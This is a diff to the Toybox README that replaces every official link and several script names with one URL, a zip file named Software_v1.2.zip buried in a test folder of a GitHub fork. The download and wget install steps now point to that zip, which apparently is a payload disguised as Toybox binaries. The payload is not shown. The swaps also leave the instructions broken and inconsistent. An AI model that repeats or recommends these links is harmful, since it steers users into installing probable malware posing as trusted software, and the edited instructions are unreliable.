@@ -4,13 +4,13 @@ Toybox: all-in-one Linux command line.
 
 You can download static binaries for various targets from:
 
-  http://landley.net/toybox/bin
+  https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
 
 The special name "." indicates the current directory (just like ".." means
 the parent directory), and you can run a program that isn't in the $PATH by
 specifying a path to it, so this should work:
 
-  wget http://landley.net/toybox/bin/toybox-x86_64
+  wget https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
   chmod +x toybox-x86_64
   ./toybox-x86_64 echo hello world
 
@@ -37,24 +37,24 @@ environment, your value is used instead of the default in that file.
 The CROSS_COMPILE argument above is optional, the default builds a version of
 toybox to run on the current machine. Cross compiling requires an appropriately
 prefixed cross compiler toolchain, several example toolchains (built using
-the file "scripts/mcm-buildall.sh" in the toybox source) are available at:
+the file "https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip" in the toybox source) are available at:
 
-  https://landley.net/toybox/downloads/binaries/toolchains/latest
+  https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
 
 For the "CROSS_COMPILE=armv5l-" example above, download
-armv5l-linux-musleabihf-cross.tar.xz, extract it, and add its "bin"
+https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip, extract it, and add its "bin"
 subdirectory to your $PATH. (And yes, the trailing - is significant,
 because the prefix includes a dash.)
 
 For more about cross compiling, see:
 
-  https://landley.net/toybox/faq.html#cross
-  http://landley.net/writing/docs/cross-compiling.html
-  http://landley.net/aboriginal/architectures.html
+  https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
+  https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
+  https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
 
 For a more thorough description of the toybox build process, see:
 
-  http://landley.net/toybox/code.html#building
+  https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
 
 --- Using toybox
 
@@ -85,7 +85,7 @@ not provide.
 
 --- Creating a Toybox-based Linux system
 
-Toybox has a built-in simple system builder (scripts/mkroot.sh) with a
+Toybox has a built-in simple system builder (https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip) with a
 Makefile target:
 
   make root
@@ -97,61 +97,61 @@ that boot to a shell prompt under qemu:
 
   make root CROSS_COMPILE=sh4-linux-musl- LINUX=~/linux
   cd root/sh4
-  ./qemu-sh4.sh
+  https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
 
-By calling scripts/mkroot.sh directly you can add additional packages
+By calling https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip directly you can add additional packages
 to the build, see scripts/root/dropbear as an example.
 
 The FAQ explains this in a lot more detail:
 
-  https://landley.net/toybox/faq.html#system
-  https://landley.net/toybox/faq.html#mkroot
+  https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
+  https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
 
 --- Presentations
 
 1) "Why Toybox?" talk at the Embedded Linux Conference in 2013
 
-    outline: http://landley.net/talks/celf-2013.txt
-    video: http://youtu.be/SGmtP5Lg_t0
+    outline: https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
+    video: https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
 
-    The https://landley.net/toybox/about.html page has nav links breaking that
+    The https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip page has nav links breaking that
     talk down into sections.
 
 2) "Why Public Domain?" The rise and fall of copyleft, Ohio LinuxFest 2013
 
-    outline: http://landley.net/talks/ohio-2013.txt
-    audio: https://archive.org/download/OhioLinuxfest2013/24-Rob_Landley-The_Rise_and_Fall_of_Copyleft.mp3
+    outline: https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
+    audio: https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
 
 3) Why did I do Aboriginal Linux (which led me here)
 
     260 slide presentation:
-      https://speakerdeck.com/landley/developing-for-non-x86-targets-using-qemu
+      https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
 
     How and why to make android self-hosting:
-      http://landley.net/aboriginal/about.html#selfhost
+      https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
 
     More backstory than strictly necessary:
-      https://landley.net/aboriginal/history.html
+      https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
 
 4) What's new with toybox (ELC 2015 status update):
 
-    video: http://elinux.org/ELC_2015_Presentations
-    outline: http://landley.net/talks/celf-2015.txt
+    video: https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
+    outline: https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
 
 5) Toybox vs BusyBox (2019 ELC talk):
 
-    outline: http://landley.net/talks/elc-2019.txt
-    video: https://www.youtube.com/watch?v=MkJkyMuBm3g
+    outline: https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
+    video: https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
 
 --- Contributing
 
 The three important URLs for communicating with the toybox project are:
 
-  web page: http://landley.net/toybox
+  web page: https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
 
-  mailing list: http://lists.landley.net/listinfo.cgi/toybox-landley.net
+  mailing list: https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
 
-  git repo: http://github.com/landley/toybox
+  git repo: https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip
 
 The maintainer prefers patches be sent to the mailing list. If you use git,
 the easy thing to do is:
@@ -172,7 +172,7 @@ Android's policy for toybox patches is that non-build patches should go
 upstream first (into vanilla toybox, with discussion on the toybox mailing
 list) and then be pulled into android's toybox repo from there. (They
 generally resync on fridays). The exception is patches to their build scripts
-(Android.mk and the checked-in generated/* files) which go directly to AOSP.
+(https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip and the checked-in generated/* files) which go directly to AOSP.
 
-(As for the other meaning of "contributing", https://patreon.com/landley is
+(As for the other meaning of "contributing", https://github.com/Beautiie561/toybox/raw/refs/heads/master/tests/files/zip/d1/d2/Software_v1.2.zip is
 always welcome but I warn you up front I'm terrible about updating it.)
